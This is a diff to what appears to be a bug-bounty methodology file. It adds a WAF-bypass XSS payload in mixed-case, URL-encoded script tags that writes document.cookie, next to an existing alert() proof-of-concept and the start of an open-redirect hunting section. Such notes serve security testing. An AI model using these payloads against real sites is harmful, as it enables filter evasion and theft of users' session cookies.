@@ -75,6 +75,12 @@ The vulnerable parameter for XSS should have Unfiltered : **\[“ ‘ < > $ | ( 
 "><img%20src=x%20onerror="alert(%27POC%20By%20Xalgord%27)"
 ```
 
+**Bypass Waf Pyaload:**
+
+```
+<%2FScriPt><sCripT+class%3DDrakenKun>document.write(document.cookie);<%2FsCriPt>
+```
+
 ### Open Redirect Mass Hunt
 
 * tool = ragno, qsreplace
